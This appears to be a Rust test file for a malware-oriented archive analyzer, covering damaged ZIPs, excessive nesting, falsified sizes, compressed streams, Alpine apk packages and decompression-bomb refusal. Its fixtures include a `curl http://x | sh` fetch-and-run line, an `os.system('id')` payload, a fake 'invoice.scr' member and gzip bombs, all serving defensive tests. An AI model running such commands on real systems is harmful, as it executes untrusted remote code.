    let analyzer = ArchiveAnalyzer::new().with_analysis_options(Arc::new(crate::AnalysisOptions {
        all_files: true,
        ..crate::AnalysisOptions::default()
    }));
    #[allow(clippy::expect_used)]
    let report = analyzer
        .analyze(&path)
        .expect("a damaged ZIP should still produce a report");
    assert!(
        !report.files.is_empty(),
        "readable ZIP members should still be analyzed"
    );
    // Without this the test could pass on an archive that simply opened
    // cleanly: the note proves a member really did fail and was contained.
    assert!(
        report
            .metadata
            .errors
            .iter()
            .any(|e| e.contains("member stream failed") || e.contains("unreadable")),
        "the failed member should be recorded, got: {:?}",
        report.metadata.errors
    );
}

/// An archive nested past the unpacking limit is not unpacked, but it must
/// not vanish: the member is reported, flagged, and marked incomplete.
#[test]
fn archive_nested_past_the_depth_limit_is_reported() {
    fn zip_of(name: &str, body: &[u8]) -> Vec<u8> {
        let mut zip = zip::ZipWriter::new(std::io::Cursor::new(Vec::new()));
        let options = zip::write::FileOptions::<()>::default()
            .compression_method(zip::CompressionMethod::Stored);
        zip.start_file(name, options).unwrap();
        std::io::Write::write_all(&mut zip, body).unwrap();
        zip.finish().unwrap().into_inner()
    }
    let mut body = zip_of("payload.py", b"import os\nos.system('id')\n");
    for name in ["c.zip", "b.zip", "a.zip"] {
        body = zip_of(name, &body);
    }
    let temp_dir = tempfile::tempdir().unwrap();
    let outer = temp_dir.path().join("outer.zip");
    std::fs::write(&outer, &body).unwrap();

    let analyzer = ArchiveAnalyzer::new().with_analysis_options(Arc::new(crate::AnalysisOptions {
        all_files: true,
        ..crate::AnalysisOptions::default()
    }));
    let report = analyzer.analyze(&outer).unwrap();
    let flagged = report.files.iter().any(|f| {
        f.findings
            .iter()
            .any(|finding| finding.id == "anti-analysis/archive/excessive-nesting")
    }) || report
        .findings
        .iter()
        .any(|finding| finding.id == "anti-analysis/archive/excessive-nesting");
    assert!(
        flagged,
        "files: {:?}",
        report.files.iter().map(|f| &f.path).collect::<Vec<_>>()
    );
}

/// The bomb check trusts a member's declared size, so reading must stop
/// there too: a member that inflates past it keeps its declared bytes (what
/// Python's `zipfile` reads) and the damage is noted.
#[test]
fn zip_member_inflating_past_its_declared_size_is_capped() {
    const DECLARED: u32 = 10;
    let body = vec![b'A'; 1 << 20];
    let mut zip = zip::ZipWriter::new(std::io::Cursor::new(Vec::new()));
    let options = zip::write::FileOptions::<()>::default()
        .compression_method(zip::CompressionMethod::Deflated);
    zip.start_file("lib/payload.py", options).unwrap();
    std::io::Write::write_all(&mut zip, &body).unwrap();
    let mut bytes = zip.finish().unwrap().into_inner();
    // Rewrite the uncompressed size in the local header (offset 22) and the
    // central directory entry (offset 24).
    for (signature, field) in [(b"PK\x03\x04", 22usize), (b"PK\x01\x02", 24)] {
        let at = bytes.windows(4).position(|w| w == signature).unwrap() + field;
        bytes[at..at + 4].copy_from_slice(&DECLARED.to_le_bytes());
    }
    let temp_dir = tempfile::tempdir().unwrap();
    let path = temp_dir.path().join("pkg.zip");
    std::fs::write(&path, &bytes).unwrap();

    let analyzer = ArchiveAnalyzer::new().with_analysis_options(Arc::new(crate::AnalysisOptions {
        all_files: true,
        ..crate::AnalysisOptions::default()
    }));
    let report = analyzer.analyze(&path).unwrap();
    let member = report
        .files
        .iter()
        .find(|f| f.path.ends_with("payload.py"))
        .expect("the declared bytes are still analyzed");
    assert_eq!(member.size, u64::from(DECLARED));
    assert!(
        report
            .findings
            .iter()
            .any(|f| f.id == "metadata/archive/parsing::partial-extraction"),
        "{:?}",
        report.findings.iter().map(|f| &f.id).collect::<Vec<_>>()
    );
}

/// A gzip named `..gz` or `...gz` has the stem `.` or `..`. Its decoded
/// payload must still be written, under a neutral name, and analyzed.
#[test]
fn gzip_whose_stem_is_a_dot_name_is_still_analyzed() {
    use flate2::Compression;
    use flate2::write::GzEncoder;

    let original_content = b"#!/bin/sh\ncurl http://x | sh\n";
    for name in ["..gz", "...gz"] {
        let temp_dir = tempfile::tempdir().unwrap();
        let gz_path = temp_dir.path().join(name);
        let mut enc = GzEncoder::new(File::create(&gz_path).unwrap(), Compression::default());
        std::io::Write::write_all(&mut enc, original_content).unwrap();
        enc.finish().unwrap();

        let analyzer =
            ArchiveAnalyzer::new().with_analysis_options(Arc::new(crate::AnalysisOptions {
                all_files: true,
                ..crate::AnalysisOptions::default()
            }));
        let report = analyzer.analyze(&gz_path).unwrap();
        assert!(
            report
                .files
                .iter()
                .any(|f| f.sha256 == calculate_sha256(original_content)),
            "{name}: decoded payload should be analyzed"
        );
    }
}

#[test]
fn test_analyze_standalone_gz() {
    // Standalone .gz (not .tar.gz) — decompressed content should be analyzed
    use flate2::Compression;
    use flate2::write::GzEncoder;

    #[allow(clippy::expect_used)]
    let temp_dir = tempfile::tempdir().expect("create temp dir");
    let gz_path = temp_dir.path().join("data.json.gz");

    // Create a standalone .gz file (not a tarball)
    let original_content = b"{\"key\": \"value\", \"items\": [1, 2, 3]}";
    {
        let file = File::create(&gz_path).unwrap();
        let mut enc = GzEncoder::new(file, Compression::default());
        std::io::Write::write_all(&mut enc, original_content).unwrap();
        enc.finish().unwrap();
    }

    let analyzer = ArchiveAnalyzer::new().with_analysis_options(Arc::new(crate::AnalysisOptions {
        all_files: true,
        ..crate::AnalysisOptions::default()
    }));
    #[allow(clippy::expect_used)]
    let report = analyzer.analyze(&gz_path).expect("analyze .gz");

    let child = report
        .files
        .iter()
        .find(|f| f.path.ends_with("data.json"))
        .expect("decompressed child should be analyzed");
    assert_eq!(child.sha256, calculate_sha256(original_content));
    assert_eq!(child.size, original_content.len() as u64);
}

#[test]
fn test_analyze_standalone_lzma() {
    let temp_dir = tempfile::tempdir().expect("create temp dir");
    // A bare stem deliberately leaves the decoded child unclassified by
    // extension. `all_files` must still analyze it as generic data rather
    // than recording only an empty path entry.
    let lzma_path = temp_dir.path().join("carrier.lzma");
    let original_content: Vec<u8> = (0..4096).map(|i| (i % 256) as u8).collect();

    let options = xz2::stream::LzmaOptions::new_preset(6).expect("LZMA options");
    let stream = xz2::stream::Stream::new_lzma_encoder(&options).expect("LZMA-alone encoder");
    let mut encoder =
        xz2::write::XzEncoder::new_stream(File::create(&lzma_path).expect("create .lzma"), stream);
    encoder.write_all(&original_content).expect("write LZMA");
    encoder.finish().expect("finish LZMA");

    let analyzer = ArchiveAnalyzer::new().with_analysis_options(Arc::new(crate::AnalysisOptions {
        all_files: true,
        ..crate::AnalysisOptions::default()
    }));
    let report = analyzer.analyze(&lzma_path).expect("analyze .lzma");

    let child = report
        .files
        .iter()
        .find(|file| file.path.ends_with("carrier"))
        .expect("decoded bare-stem child should be analyzed");
    assert_eq!(child.file_type, "data");
    assert!(
        child.filefacts_metrics.is_some(),
        "generic data child should retain file facts and metrics"
    );

    assert_eq!(child.sha256, calculate_sha256(&original_content));
    assert_eq!(child.size, original_content.len() as u64);
}

#[test]
fn test_analyze_standalone_bz2_wrapped_tar_without_tar_extension() {
    let temp_dir = tempfile::tempdir().expect("create temp dir");
    let bz2_path = temp_dir.path().join("payload.unknown");

    let mut tar_data = Vec::new();
    {
        let contents = b"inner executable placeholder";
        let mut header = [0u8; 512];
        header[0.."invoice.scr".len()].copy_from_slice(b"invoice.scr");
        header[100..108].copy_from_slice(b"0000755\0");
        header[108..116].copy_from_slice(b"0000000\0");
        header[116..124].copy_from_slice(b"0000000\0");
        let size = format!("{:011o}\0", contents.len());
        header[124..136].copy_from_slice(size.as_bytes());
        header[136..148].copy_from_slice(b"00000000000\0");
        header[148..156].fill(b' ');
        header[156] = b'0';
        let checksum = header.iter().map(|b| *b as u32).sum::<u32>();
        let checksum = format!("{:06o}\0 ", checksum);
        header[148..156].copy_from_slice(checksum.as_bytes());

        tar_data.extend_from_slice(&header);
        tar_data.extend_from_slice(contents);
        let padding = (512 - (contents.len() % 512)) % 512;
        tar_data.extend(std::iter::repeat_n(0, padding));
        tar_data.extend(std::iter::repeat_n(0, 1024));
    }

    {
        let file = File::create(&bz2_path).expect("create bz2");
        let mut enc = bzip2::write::BzEncoder::new(file, bzip2::Compression::default());
        enc.write_all(&tar_data).expect("write bz2 tar");
        enc.finish().expect("finish bz2");
    }

    let analyzer = ArchiveAnalyzer::new().with_analysis_options(Arc::new(crate::AnalysisOptions {
        all_files: true,
        ..crate::AnalysisOptions::default()
    }));
    let report = analyzer.analyze(&bz2_path).expect("analyze .bz2 tar");

    assert!(
        report.files.iter().any(|f| f.path.ends_with("invoice.scr")),
        "bzip2-wrapped tar should recurse into tar members, got files: {:?}",
        report.files.iter().map(|f| &f.path).collect::<Vec<_>>()
    );
}

#[test]
fn test_analyze_standalone_zstd() {
    #[allow(clippy::expect_used)]
    let temp_dir = tempfile::tempdir().expect("create temp dir");
    let zst_path = temp_dir.path().join("meta.json.zst");

    // Create a standalone .zst file
    let original_content = b"{\"name\": \"test-package\", \"version\": \"1.0.0\"}";
    {
        let compressed = zstd::encode_all(Cursor::new(original_content), 3).unwrap();
        std::fs::write(&zst_path, compressed).unwrap();
    }

    let analyzer = ArchiveAnalyzer::new();
    #[allow(clippy::expect_used)]
    let report = analyzer.analyze(&zst_path).expect("analyze .zst");

    let child = report
        .files
        .iter()
        .find(|f| f.path.ends_with("meta.json"))
        .expect("decompressed child should be analyzed");
    assert_eq!(child.sha256, calculate_sha256(original_content));
    assert_eq!(child.size, original_content.len() as u64);
}

/// Build one gzip-compressed tar segment from `(path, contents)` members.
/// A real apk is several of these concatenated; tests build the segments
/// separately and join them so the fixture matches the on-disk format.
#[allow(clippy::expect_used)]
fn apk_gzip_tar_segment(members: &[(&str, &[u8])]) -> Vec<u8> {
    use flate2::Compression;
    use flate2::write::GzEncoder;
    use tar::Builder;

    let enc = GzEncoder::new(Vec::new(), Compression::default());
    let mut tar_builder = Builder::new(enc);
    for (path, contents) in members {
        let mut header = tar::Header::new_gnu();
        header.set_path(path).expect("set tar path");
        header.set_size(contents.len() as u64);
        header.set_mode(0o644);
        header.set_cksum();
        tar_builder
            .append(&header, *contents)
            .expect("append member");
    }
    tar_builder
        .into_inner()
        .expect("finish tar")
        .finish()
        .expect("finish gzip")
}

#[test]
fn test_alpine_apk_detected_via_gzip_tar_path() {
    #[allow(clippy::expect_used)]
    let temp_dir = tempfile::tempdir().expect("create temp dir");
    let apk_path = temp_dir.path().join("sample.apk");

    {
        // A real apk concatenates independent gzip streams: the control
        // segment (`.PKGINFO`) followed by the data segment (installed
        // files). The data member must live in its *own* segment — a single
        // combined tar would mask the multi-segment walking this verifies.
        let control = apk_gzip_tar_segment(&[(
            ".PKGINFO",
            b"pkgname = ruby3.2-public_suffix\npkgver = 6.0.0-r0\n",
        )]);
        let data = apk_gzip_tar_segment(&[(
            "usr/lib/ruby/gems/3.2.0/gems/public_suffix-6.0.1/lib/public_suffix.rb",
            b"File.open(\"the_Score.vbs\", \"w\")\n",
        )]);

        let mut file = File::create(&apk_path).unwrap();
        file.write_all(&control).unwrap();
        file.write_all(&data).unwrap();
    }

    let analyzer = ArchiveAnalyzer::new();
    #[allow(clippy::expect_used)]
    let report = analyzer.analyze(&apk_path).expect("analyze alpine apk");

    // Alpine `.apk` now carries its own ecosystem type (routed through the
    // gzip-tar extraction path, which the member assertion below verifies).
    assert_eq!(report.target.file_type, "apk_alpine");
    assert!(
        report
            .files
            .iter()
            .any(|f| f.path.ends_with("public_suffix.rb")),
        "expected ruby archive member to be analyzed, got files: {:?}",
        report.files.iter().map(|f| &f.path).collect::<Vec<_>>()
    );
    assert!(
        report
            .structure
            .iter()
            .any(|s| s.id == "archive/apk_alpine"),
        "expected apk_alpine structural marker, got: {:?}",
        report.structure.iter().map(|s| &s.id).collect::<Vec<_>>()
    );
}

/// Every container format must reach a member extractor.
///
/// `extract_from_data` ends in `_ => bail!("Unsupported archive type")`, so a
/// newly added container that is registered as an archive but missed here
/// fails silently: members are never extracted, no child findings exist, and
/// nothing is promoted to the parent. The container then scores as if it
/// were empty, which is indistinguishable from a clean file.
///
/// The list mirrors `filefacts::FileType::is_archive`, which is the source
/// of truth for "this is a container"; the two are hand-written, so this
/// test exists to stop them drifting apart. `Chm` and `Asar` are handled by
/// dedicated in-memory paths in `analyze_archive` that return before the
/// match, so they are listed as handled here too.
#[test]
fn every_archive_type_reaches_an_extractor() {
    let source = include_str!("mod.rs");
    let dispatch_start = source
        .find("fn extract_from_data")
        .expect("extract_from_data present");
    let dispatch_end = source[dispatch_start..]
        .find("Unsupported archive type")
        .expect("fallback arm present")
        + dispatch_start;
    let dispatch = &source[dispatch_start..dispatch_end];

    // Handled ahead of the match, in `analyze_archive`.
    let dedicated = ["Chm", "Asar", "Phar"];

    // Mirrors `FileType::is_archive()`.
    let containers = [
        "Zip",
        "GoModule",
        "Composer",
        "Hex",
        "Pub",
        "Cran",
        "Cpan",
        "Hackage",
        "Tar",
        "Cpio",
        "TarGz",
        "TarBz2",
        "TarXz",
        "TarZst",
        "Gz",
        "Bz2",
        "Xz",
        "Lzma",
        "Zst",
        "SevenZ",
        "Rar",
        "Deb",
        "Rpm",
        "PkgMacos",
        "Dmg",
        "Iso",
        "Cab",
        "Chm",
        "Crx",
        "Xpi",
        "Whl",
        "Gem",
        "ApkAndroid",
        "ApkAlpine",
        "Npm",
        "Crate",
        "Conda",
        "Egg",
        "Nupkg",
        "Ipa",
        "Vsix",
        "PkgFreebsd",
        "PkgArch",
        "PythonSdist",
        "OciImage",
        "Xbps",
        "GentooBinpkg",
        "Asar",
        "Phar",
        "Jar",
    ];

    let missing: Vec<&str> = containers
        .iter()
        .copied()
        .filter(|name| {
            !dedicated.contains(name) && !dispatch.contains(&format!("FileType::{name}"))
        })
        .collect();
    assert!(
        missing.is_empty(),
        "container types with no member extractor (their children would never \
             be analyzed and nothing would promote to the parent): {missing:?}"
    );
}

/// A small plain stream decodes to exactly one leaf file named after the
/// archive's stem, and a nested chain leaves only the innermost file —
/// no `.cleave-decode-` scratch files survive.
#[test]
fn single_stream_decodes_to_leaf_file() {
    use flate2::write::GzEncoder;

    let gz = |data: &[u8]| {
        let mut enc = GzEncoder::new(Vec::new(), flate2::Compression::default());
        enc.write_all(data).unwrap();
        enc.finish().unwrap()
    };

    let dest = tempfile::tempdir().unwrap();
    let guard = ExtractionGuard::new();
    decompress_to_file(
        flate2::read::GzDecoder::new(Cursor::new(&gz(b"hello"))),
        Path::new("note.txt.gz"),
        dest.path(),
        1,
        &guard,
    )
    .unwrap();
    assert_eq!(
        std::fs::read(dest.path().join("note.txt")).unwrap(),
        b"hello"
    );

    let nested = tempfile::tempdir().unwrap();
    let guard = ExtractionGuard::new();
    decompress_to_file(
        flate2::read::GzDecoder::new(Cursor::new(&gz(&gz(b"payload")))),
        Path::new("chain.gz"),
        nested.path(),
        1,
        &guard,
    )
    .unwrap();
    let entries: Vec<_> = std::fs::read_dir(nested.path())
        .unwrap()
        .map(|e| e.unwrap().file_name().to_string_lossy().into_owned())
        .collect();
    assert_eq!(entries, vec!["chain".to_string()], "only the leaf remains");
    assert_eq!(
        std::fs::read(nested.path().join("chain")).unwrap(),
        b"payload"
    );
}

/// A single-stream bomb past the ratio thresholds must be refused outright.
/// The guards used to record the finding and continue anyway — after
/// buffering the entire stream in memory (up to the 20 GB read cap).
#[test]
fn single_stream_bomb_is_refused() {
    use flate2::write::GzEncoder;

    // 256 MiB of zeros gzips to a few hundred KB: ratio ~1000:1, past
    // both MAX_COMPRESSION_RATIO and MIN_ZIP_BOMB_UNCOMPRESSED_SIZE.
    let mut enc = GzEncoder::new(Vec::new(), flate2::Compression::default());
    enc.write_all(&vec![0u8; 256 * 1024 * 1024]).unwrap();
    let bomb = enc.finish().unwrap();
    assert!(bomb.len() < 4 * 1024 * 1024, "fixture must stay small");

    let dest = tempfile::tempdir().unwrap();
    let guard = ExtractionGuard::new();
    let err = decompress_to_file(
        flate2::read::GzDecoder::new(Cursor::new(&bomb)),
        Path::new("bomb.gz"),
        dest.path(),
        bomb.len() as u64,
        &guard,
    )
    .unwrap_err();
    assert!(
        err.to_string().contains("bomb"),
        "expected bomb refusal, got: {err:#}"
    );
    // Refusal must not leave scratch files behind.
    let leftovers: Vec<_> = std::fs::read_dir(dest.path())
        .unwrap()
        .map(|e| e.unwrap().file_name().to_string_lossy().into_owned())
        .collect();
    assert!(leftovers.is_empty(), "leftovers: {leftovers:?}");
}

#[test]
fn rejected_stream_releases_scratch_before_finishing_decode() {
    struct MeasuredZeros {
        remaining: u64,
        emitted: u64,
        peak_file_len: u64,
        dest: std::path::PathBuf,
    }

    impl std::io::Read for MeasuredZeros {
        fn read(&mut self, buf: &mut [u8]) -> std::io::Result<usize> {
            if self.emitted.is_multiple_of(16 * 1024 * 1024) {
                let current = std::fs::read_dir(&self.dest)?
                    .map(|entry| entry.and_then(|entry| entry.metadata()).map(|m| m.len()))
                    .collect::<std::io::Result<Vec<_>>>()?
                    .into_iter()
                    .max()
                    .unwrap_or(0);
                self.peak_file_len = self.peak_file_len.max(current);
            }
            let n = buf.len().min(self.remaining as usize);
            buf[..n].fill(0);
            self.remaining -= n as u64;
            self.emitted += n as u64;
            Ok(n)
        }
    }

    let dest = tempfile::tempdir().unwrap();
    let guard = ExtractionGuard::new();
    let uncompressed = 512 * 1024 * 1024;
    let mut decoded = MeasuredZeros {
        remaining: uncompressed,
        emitted: 0,
        peak_file_len: 0,
        dest: dest.path().to_path_buf(),
    };
    let err =
        decompress_to_file(&mut decoded, Path::new("bomb.gz"), dest.path(), 1, &guard).unwrap_err();
    assert!(err.to_string().contains("bomb"), "{err:#}");
    assert_eq!(decoded.emitted, uncompressed);
    assert!(
        decoded.peak_file_len < 300 * 1024 * 1024,
        "rejected decoded stream retained {} bytes of scratch",
        decoded.peak_file_len
    );
    assert!(std::fs::read_dir(dest.path()).unwrap().next().is_none());
    assert!(guard.take_reasons().iter().any(|reason| matches!(
        reason,
        guards::HostileArchiveReason::ZipBomb {
            compressed: 1,
            uncompressed: size,
        } if *size == uncompressed
    )));
}
